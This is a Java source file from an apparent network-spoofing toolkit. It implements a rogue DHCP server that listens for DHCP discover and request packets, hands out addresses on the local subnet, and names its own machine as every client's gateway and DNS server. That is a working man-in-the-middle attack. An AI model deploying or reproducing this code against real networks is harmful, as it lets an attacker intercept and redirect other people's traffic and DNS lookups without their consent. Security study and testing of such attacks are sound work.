package org.bitducks.spoofing.services.dhcprogue;

import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Collection;
import java.util.Collections;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Set;
import java.util.Timer;

import jpcap.JpcapCaptor;
import jpcap.NetworkInterface;
import jpcap.NetworkInterfaceAddress;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.Packet;
import jpcap.packet.UDPPacket;

import org.bitducks.spoofing.core.Policy;
import org.bitducks.spoofing.core.Server;
import org.bitducks.spoofing.core.Service;
import org.bitducks.spoofing.core.rules.DHCPRule;
import org.bitducks.spoofing.packet.PacketFactory;
import org.bitducks.spoofing.scan.IpRange;
import org.bitducks.spoofing.util.Constants;
import org.bitducks.spoofing.util.IpUtil;
import org.dhcp4java.DHCPConstants;
import org.dhcp4java.DHCPPacket;
import org.dhcp4java.DHCPResponseFactory;

public class RogueDHCPService extends Service {

	/**
	 * The available IP address
	 */
	private Iterator<InetAddress> range;

	/**
	 * The network interface
	 */
	private NetworkInterface device;

	/**
	 * The address of the server
	 */
	private InetAddress server;

	/**
	 * The address of the clients who has disconnected
	 */
	private List<InetAddress> freeAddress = Collections.synchronizedList(new LinkedList<InetAddress>());

	/**
	 * The given adresses
	 */
	private Set<InetAddress> givenAdresses = Collections.synchronizedSet(new HashSet<InetAddress>());

	private Timer timer = new Timer();

	public RogueDHCPService() {
		Policy policy = this.getPolicy();
		policy.addRule(new DHCPRule());

		this.device = Server.getInstance().getNetworkInterface();

		NetworkInterfaceAddress deviceAddress = this.device.addresses[0];

		this.server = deviceAddress.address;
		this.range = new IpRange(
				IpUtil.network(deviceAddress), 
				IpUtil.lastIpInNetwork2(deviceAddress))
		.iterator();
		this.range.next();
	}

	@Override
	public void run() {
		this.timer.schedule(new HostDown(this, this.givenAdresses), 60 * 60 * 1000); //For 1 hour

		while(!this.isCloseRequested()) {
			Packet p = this.getNextPacket();
			//System.out.println(p);
			if(p != null) {
				try {
					DHCPPacket dhcp = DHCPPacket.getPacket(p.data, 0, p.data.length, false);
					byte option = dhcp.getDHCPMessageType();

					switch(option) {
					case DHCPConstants.DHCPDISCOVER:
						this.makeOffer(dhcp);
						break;
					case DHCPConstants.DHCPREQUEST:
						this.makeAck(dhcp);
						break;
					}
				} catch(Exception e) /* We catch all exception if the packet is bad */{ e.printStackTrace(); }
			}
		}

		this.timer.cancel();
	}

	private void makeOffer(DHCPPacket dhcp) throws UnknownHostException {
		InetAddress offer;
		do {
			offer = this.getAddressOffer();
			this.givenAdresses.add(offer);
		} while(this.sendArp(offer, 100)); //While the arp request has a reply, we take the next address
		
		DHCPPacket dhcpOffer = DHCPResponseFactory.makeDHCPOffer(dhcp, offer, 0xffffffff, this.server, "", null);

		this.sendDHCPPacket(dhcpOffer);
	}

	private void makeAck(DHCPPacket dhcp) throws UnknownHostException {
		InetAddress ip = dhcp.getOptionAsInetAddr((byte) 50);
		DHCPPacket dhcpAck = DHCPResponseFactory.makeDHCPAck(dhcp, ip, 0xffffffff, this.server, "", null);

		this.sendDHCPPacket(dhcpAck);
	}

	private void sendDHCPPacket(DHCPPacket dhcp) throws UnknownHostException {
		this.setDHCPOption(dhcp);

		EthernetPacket ether = this.getEthernetHeader();

		UDPPacket udp = new UDPPacket(67, 68);
		udp.datalink = ether;
		this.setIPv4Parameter(udp);
		udp.data = dhcp.serialize();

		Server.getInstance().sendPacket(udp);
	}

	private EthernetPacket getEthernetHeader() {
		EthernetPacket ether = new EthernetPacket();
		ether.frametype = EthernetPacket.ETHERTYPE_IP;
		ether.src_mac = this.device.mac_address;
		ether.dst_mac = Constants.BROADCAST;
		return ether;
	}

	private void setIPv4Parameter(UDPPacket udp) throws UnknownHostException {
		udp.setIPv4Parameter(0, 
				false, 
				false, 
				false, 
				0, 
				false, 
				false, 
				false, 
				0, 
				0, 						// Identifier
				64, 					// TTL
				IPPacket.IPPROTO_UDP,  	// Protocol
				this.server,
				InetAddress.getByAddress(new byte[] {(byte) 255, (byte) 255, (byte) 255, (byte) 255}));
	}

	private void setDHCPOption(DHCPPacket dhcp) {
		// Subnet mask address
		dhcp.setOptionRaw((byte) 1, this.device.addresses[0].subnet.getAddress());

		// Broadcast IP Address 
		dhcp.setOptionRaw((byte) 28, this.device.addresses[0].broadcast.getAddress());

		// Gateway
		dhcp.setOptionAsInetAddress((byte) 3, this.server);

		//DNS Server
		dhcp.setOptionAsInetAddresses((byte) 6, new InetAddress[] {this.server, this.server});
	}

	private InetAddress getAddressOffer() {
		if(!freeAddress.isEmpty()) {
			return this.freeAddress.remove(0);
		} else {
			return this.range.next();
		}
	}

	/* package visibility */ void addFreeAddress(Collection<InetAddress> address) {
		this.freeAddress.addAll(address);
		this.givenAdresses.removeAll(address);
		this.timer.schedule(new HostDown(this, this.givenAdresses), 60 * 60 * 1000); //For 1 hour
	}

	private boolean sendArp(InetAddress addr, int timeout) {
		try {
			JpcapCaptor captor = JpcapCaptor.openDevice(Server.getInstance().getNetworkInterface(), 65000, true, timeout);

			captor.setFilter("arp[6:2] == 2 && arp src " + addr.getHostAddress(), false);

			ARPPacket arp = PacketFactory.arpRequest(Server.getInstance().getNetworkInterface().mac_address,
					Server.getInstance().getNetworkInterface().addresses[0].address, 
					addr);

			Server.getInstance().sendPacket(arp);
			Packet p = captor.getPacket();
			if(p != null) {
				return true;
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		return false;
	}
}
